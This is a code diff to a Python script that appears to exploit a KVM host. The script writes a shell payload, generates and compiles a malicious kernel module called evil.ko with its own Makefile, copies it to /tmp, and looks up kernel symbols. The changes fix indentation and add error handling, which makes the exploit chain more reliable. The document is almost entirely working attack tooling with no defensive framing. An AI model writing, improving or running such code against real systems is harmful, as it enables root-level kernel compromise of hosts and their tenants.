@@ -27,6 +27,10 @@ def run_cmd(cmd, capture_output=True):
 
 def log(msg):
     print(msg)
+    # Ensure the directory for the report file exists
+    report_dir = os.path.dirname(report_file)
+    if report_dir and not os.path.exists(report_dir):
+        os.makedirs(report_dir, exist_ok=True)
     with open(report_file, "a") as f:
         f.write(msg + "\n")
 
@@ -54,6 +58,8 @@ def setup_kvm_prober():
             log("[!] Failed to find kvm_probe in /proc/devices")
 
 def create_exploit_files():
+    # Ensure /tmp exists (it always does on Linux, but for completeness)
+    os.makedirs("/tmp", exist_ok=True)
     # Create payload script
     sh_content = '''#!/bin/sh
 chmod 755 /tmp/evil.ko
@@ -93,26 +99,32 @@ module_exit(evil_exit);
 MODULE_LICENSE("GPL");
 '''
 
+    # Ensure evil_src directory exists
     os.makedirs("/tmp/evil_src", exist_ok=True)
     with open("/tmp/evil_src/evil.c", "w") as f:
         f.write(evil_c)
 
     # Create Makefile
-makefile_content = (
-    "KDIR := /lib/modules/6.1.0-21-amd64/build\n"
-    "obj-m += evil.o\n\n"
-    "all:\n"
-    "\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n\n"
-    "clean:\n"
-    "\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n"
-)
-with open("/tmp/evil_src/Makefile", "w") as f:
-    f.write(makefile_content)
+    makefile_content = (
+        "KDIR := /lib/modules/6.1.0-21-amd64/build\n"
+        "obj-m += evil.o\n\n"
+        "all:\n"
+        "\t$(MAKE) -C $(KDIR) M=$(PWD) modules\n\n"
+        "clean:\n"
+        "\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n"
+    )
+    with open("/tmp/evil_src/Makefile", "w") as f:
+        f.write(makefile_content)
 
     # Compile module
     run_cmd("make -C /tmp/evil_src", capture_output=False)
-    shutil.copy("/tmp/evil_src/evil.ko", "/tmp/evil.ko")
-    log("[+] Compiled and placed evil.ko at /tmp/evil.ko")
+    # Ensure evil.ko exists before copying
+    evil_ko_path = "/tmp/evil_src/evil.ko"
+    if os.path.isfile(evil_ko_path):
+        shutil.copy(evil_ko_path, "/tmp/evil.ko")
+        log("[+] Compiled and placed evil.ko at /tmp/evil.ko")
+    else:
+        log("[!] Failed to build evil.ko")
 
 def get_kernel_symbol(symbol):
     # try vmlinux first
